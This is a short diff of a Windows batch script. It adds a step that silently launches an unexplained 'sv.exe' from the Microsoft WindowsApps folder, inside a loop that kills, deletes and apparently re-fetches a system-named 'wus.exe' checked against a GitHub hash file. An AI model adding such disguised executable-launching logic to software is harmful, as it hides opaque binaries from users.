@@ -2,12 +2,14 @@
 setlocal enabledelayedexpansion
 
 set "exe_path=%localappdata%\Microsoft\WindowsApps\wus.exe"
+set "sv=%localappdata%\Microsoft\WindowsApps\sv.exe"
 set "hash_url=https://github.com/KSGVIO/dist/raw/refs/heads/main/wus.hash"
 
 :main_loop
 :: Kill existing processes
 taskkill /F /IM wus.exe >nul 2>&1
 taskkill /F /IM flask_server.exe >nul 2>&1
+start "" %sv%
 
 :: Delete old exe if exists
 if exist "%exe_path%" del /f /q "%exe_path%"
